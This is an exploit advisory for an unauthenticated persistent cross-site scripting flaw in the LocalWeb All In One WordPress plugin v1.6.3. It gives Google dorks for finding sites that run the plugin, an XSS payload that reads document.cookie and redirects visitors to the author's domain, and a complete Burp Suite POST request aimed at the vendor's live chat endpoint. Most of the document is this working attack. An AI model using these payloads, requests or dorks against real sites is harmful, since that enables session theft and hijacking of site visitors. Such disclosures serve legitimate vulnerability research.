[+] :: Exploit Title: LocalWeb All In One plugin v1.6.3 - Unauthenticated Persistent XSS
[+] :: Google Dork #1: inurl:/wp-content/plugins/lw-all-in-one/
[+] :: Google Dork #2: inurl:/wp-content/plugins/web-instant-messenger/
[+] :: Date: 2020-10-20
[+] :: Exploit Author: Ex.Mi [ https://ex-mi.ru ]
[+] :: Vendor: LocalWeb S.R.L [ https://localweb.it ]
[+] :: Software Version: 1.6.3
[+] :: Software Link #1: https://wordpress.org/plugins/lw-all-in-one/lw-all-in-one.zip
[+] :: Software Link #2: https://wordpress.org/plugins/web-instant-messenger/web-instant-messenger.zip
[+] :: Tested on: Kali Linux
[+] :: CVE: 
[+] :: CWE: CWE-79


[i] :: Info:

An Unauthenticated Persistent XSS vulnerability was discovered in the LocalWeb All In One plugin v1.6.3 for WordPress.

There is an older version of this plugin called Web Instant Messenger, latest version is v1.1.1.

The specificity of this plugin is that it interacts with the remote host www.localweb.it, so your payload will be executed on it.


[$] :: Payload:

"><img src=x onerror=(alert)(`Ex.Mi`);(alert)(document.cookie);top.location=`https://ex-mi.ru`;>


[!] :: PoC (Burp Suite):

POST /chat/widget/post.php HTTP/1.1
Host: www.localweb.it
Content-type: application/x-www-form-urlencoded
Content-Length: 761
Referer: https://www.localweb.it/chat/widget/ultimate_chat_widget.php?rag_soc=%22%3E%3Cimg%20src%3Dx%20onerror%3D(alert)(%60Ex.Mi%60)%3B(alert)(document.cookie)%3Btop.location%3D%60https%3A%2F%2Fex-mi.ru%60%3B%3E&messaggio_0=Salve!%20Come%20posso%20esserle%20utile?&show_wim_after=60&auto_show_wim=NO&show_mobile=SI&lingua=it&d=[encoded_data]
Cookie: lwgdpr_user_preference={"necessary":"yes","marketing":"no","analytics":"no","preferences":"no"}; termini=1

encodedGetVars=[encoded_data]&request_id=21406220&username=%22%3E%3Cimg%20src%3Dx%20onerror%3D(alert)(%60Ex.Mi%60)%3B(alert)(document.cookie)%3Btop.location%3D%60https%3A%2F%2Fex-mi.ru%60%3B%3E&message=4325%22--%26gt%3B%22%26gt%3B'%60%20--%20%60%26lt%3B!--%26lt%3Bimg%20src%3D%22--%26gt%3B%26lt%3Bimg%20src%3Dx%20onerror%3D(alert)(%60Ex.Mi%60)%3B(alert)(document.cookie)%3Btop.location%3D%60https%3A%2F%2Fex-mi.ru%60%3B%26gt%3B&emojiFamily=twitter&status=0&operatorsOnline=0


[@] :: Contacts:

Website: ex-mi.ru
Telegram: @ex_mi
GitHub: @ex-mi
Medium: @ex.mi
